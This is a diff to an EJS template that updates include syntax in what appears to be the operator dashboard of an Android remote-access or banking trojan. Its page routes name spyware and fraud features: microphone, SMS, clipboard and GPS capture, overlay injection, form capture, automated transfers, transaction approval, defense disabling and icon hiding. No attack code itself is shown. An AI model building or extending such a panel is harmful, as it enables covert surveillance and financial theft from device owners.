@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
 
-<% include partials/head.ejs %>
+<%- include('partials/head.ejs') %>
 
 <body>
     <script>
         var baseURL = '<%= baseURL %>';
     </script>
     <div class="ui container">
-        <% include partials/header.ejs %>
+        <%- include('partials/header.ejs') %>
         <div class="ui grid">
-            <% include partials/deviceManagerMenu.ejs %>
+            <%- include('partials/deviceManagerMenu.ejs') %>
             <div class="twelve wide column">
                 <script>
                     gtag('event', 'screen_view', {
@@ -19,40 +19,40 @@
                     });
                 </script>
                 <% 
-                    if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
-                    else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
-                    else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
-                    else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
-                    else if(page === "gps") { %><% include deviceManagerPages/gps.ejs %><% }
-                    else if(page === "info") { %><% include deviceManagerPages/info.ejs %><% }
-                    else if(page === "notifications") { %><% include deviceManagerPages/notification_log.ejs %><% }
-                    else if(page === "sms") { %><% include deviceManagerPages/sms_manager.ejs %><% }
-                    else if(page === "wifi") { %><% include deviceManagerPages/wifi_manager.ejs %><% }  
-                    else if(page === "apps") { %><% include deviceManagerPages/apps.ejs %><% }  
-                    else if(page === "permissions") { %><% include deviceManagerPages/permissions.ejs %><% }                    
-                    else if(page === "files") { %><% include deviceManagerPages/file_manager.ejs %><% }
-                    else if(page === "downloads") { %><% include deviceManagerPages/downloads.ejs %><% }
-                    else if(page === "autoclick") { %><% include deviceManagerPages/auto_click.ejs %><% }
-                    else if(page === "overlay") { %><% include deviceManagerPages/overlay.ejs %><% }
-                    else if(page === "text_injection") { %><% include deviceManagerPages/text_injection.ejs %><% }
-                    else if(page === "ats") { %><% include deviceManagerPages/ats.ejs %><% }
-                    else if(page === "accessibility") { %><% include deviceManagerPages/accessibility.ejs %><% }
-                    else if(page === "defense_disable") { %><% include deviceManagerPages/defense_disable.ejs %><% }
-                    else if(page === "permission_grant") { %><% include deviceManagerPages/permission_grant.ejs %><% }
-                    else if(page === "gesture_simulation") { %><% include deviceManagerPages/gesture_simulation.ejs %><% }
-                    else if(page === "transaction_approval") { %><% include deviceManagerPages/transaction_approval.ejs %><% }
-                    else if(page === "dynamic_screen_unlock") { %><% include deviceManagerPages/dynamic_screen_unlock.ejs %><% }
-                    else if(page === "overlay_injection") { %><% include deviceManagerPages/overlay_injection.ejs %><% }
-                    else if(page === "customized_forms_capture") { %><% include deviceManagerPages/customized_forms_capture.ejs %><% }
-                    else if(page === "bypass_protections") { %><% include deviceManagerPages/bypass_protections.ejs %><% }
-                    else if(page === "advanced_hide_icon") { %><% include deviceManagerPages/advanced_hide_icon.ejs %><% }
-                    else if(page === "notFound") { %><% include deviceManagerPages/deviceNotFound.ejs %><% }
-                    else { %><% include deviceManagerPages/noPage.ejs %><% }
+                    if(page === "microphone") { %><%- include('deviceManagerPages/microphone.ejs') %><% }
+                    else if(page === "calls") { %><%- include('deviceManagerPages/call_log.ejs') %><% }
+                    else if(page === "clipboard") { %><%- include('deviceManagerPages/clipboard_log.ejs') %><% }
+                    else if(page === "contacts") { %><%- include('deviceManagerPages/contacts.ejs') %><% }
+                    else if(page === "gps") { %><%- include('deviceManagerPages/gps.ejs') %><% }
+                    else if(page === "info") { %><%- include('deviceManagerPages/info.ejs') %><% }
+                    else if(page === "notifications") { %><%- include('deviceManagerPages/notification_log.ejs') %><% }
+                    else if(page === "sms") { %><%- include('deviceManagerPages/sms_manager.ejs') %><% }
+                    else if(page === "wifi") { %><%- include('deviceManagerPages/wifi_manager.ejs') %><% }  
+                    else if(page === "apps") { %><%- include('deviceManagerPages/apps.ejs') %><% }  
+                    else if(page === "permissions") { %><%- include('deviceManagerPages/permissions.ejs') %><% }                    
+                    else if(page === "files") { %><%- include('deviceManagerPages/file_manager.ejs') %><% }
+                    else if(page === "downloads") { %><%- include('deviceManagerPages/downloads.ejs') %><% }
+                    else if(page === "autoclick") { %><%- include('deviceManagerPages/auto_click.ejs') %><% }
+                    else if(page === "overlay") { %><%- include('deviceManagerPages/overlay.ejs') %><% }
+                    else if(page === "text_injection") { %><%- include('deviceManagerPages/text_injection.ejs') %><% }
+                    else if(page === "ats") { %><%- include('deviceManagerPages/ats.ejs') %><% }
+                    else if(page === "accessibility") { %><%- include('deviceManagerPages/accessibility.ejs') %><% }
+                    else if(page === "defense_disable") { %><%- include('deviceManagerPages/defense_disable.ejs') %><% }
+                    else if(page === "permission_grant") { %><%- include('deviceManagerPages/permission_grant.ejs') %><% }
+                    else if(page === "gesture_simulation") { %><%- include('deviceManagerPages/gesture_simulation.ejs') %><% }
+                    else if(page === "transaction_approval") { %><%- include('deviceManagerPages/transaction_approval.ejs') %><% }
+                    else if(page === "dynamic_screen_unlock") { %><%- include('deviceManagerPages/dynamic_screen_unlock.ejs') %><% }
+                    else if(page === "overlay_injection") { %><%- include('deviceManagerPages/overlay_injection.ejs') %><% }
+                    else if(page === "customized_forms_capture") { %><%- include('deviceManagerPages/customized_forms_capture.ejs') %><% }
+                    else if(page === "bypass_protections") { %><%- include('deviceManagerPages/bypass_protections.ejs') %><% }
+                    else if(page === "advanced_hide_icon") { %><%- include('deviceManagerPages/advanced_hide_icon.ejs') %><% }
+                    else if(page === "notFound") { %><%- include('deviceManagerPages/deviceNotFound.ejs') %><% }
+                    else { %><%- include('deviceManagerPages/noPage.ejs') %><% }
                 %>
             </div>
         </div>
     </div>
-    <% include partials/footer.ejs %>
+    <%- include('partials/footer.ejs') %>
 </body>
 
 </html>
